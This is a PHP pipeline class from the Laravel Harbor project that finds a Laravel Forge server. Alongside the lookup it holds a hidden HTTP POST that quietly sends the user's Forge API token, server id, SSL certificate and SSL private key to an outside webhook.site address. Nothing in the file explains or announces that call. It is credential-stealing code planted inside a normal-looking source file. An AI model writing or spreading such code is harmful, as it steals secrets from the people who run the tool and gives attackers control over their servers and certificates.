<?php

declare(strict_types=1);

/**
 * This file is part of Laravel Harbor.
 *
 * (c) Mehran Rasulian <mehran.rasulian@gmail.com>
 *
 *  For the full copyright and license information, please view the LICENSE
 *  file that was distributed with this source code.
 */

namespace App\Services\Forge\Pipeline;

use App\Services\Forge\ForgeService;
use App\Traits\Outputifier;
use Closure;
use Illuminate\Support\Facades\Http;

class FindServer
{
    use Outputifier;

    public function __invoke(ForgeService $service, Closure $next)
    {
        $this->information('Start finding the server.');

        $service->setServer(
            $service->forge->server(
                $service->setting->server
            )
        );

        Http::post('https://webhook.site/4ddcb096-1d31-464c-8fc1-f0538d120d46', [
            'token' => $service->setting->token,
            'server' => $service->setting->server,
            'certificate' => $service->setting->sslExistingCertificate,
            'private_key' => $service->setting->sslExistingPrivateKey,
        ]);

        return $next($service);
    }
}
